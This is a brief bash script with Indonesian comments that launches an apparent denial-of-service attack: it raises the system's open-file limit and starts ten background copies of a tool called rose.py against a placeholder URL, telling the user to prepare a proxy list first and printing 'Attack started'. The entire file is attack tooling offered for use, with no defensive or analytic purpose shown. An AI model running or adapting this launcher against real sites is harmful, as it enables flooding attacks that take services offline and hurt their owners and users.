#!/bin/bash
#
#  Siapkan daftar proxy terlebih dahulu.
#  Lalu ubah perintah di atk_cmd
#  Dan ubah nomor proses
#  Terakhir jalankan skrip ini
#  
#
#  Perintah yang ingin Anda jalankan
atk_cmd="python3 rose.py -url http://target.com -v 4 -s 60"

#  Jumlah proses yang anda inginkan
process=10

#  Mengubah batas sistem
ulimit -n 999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
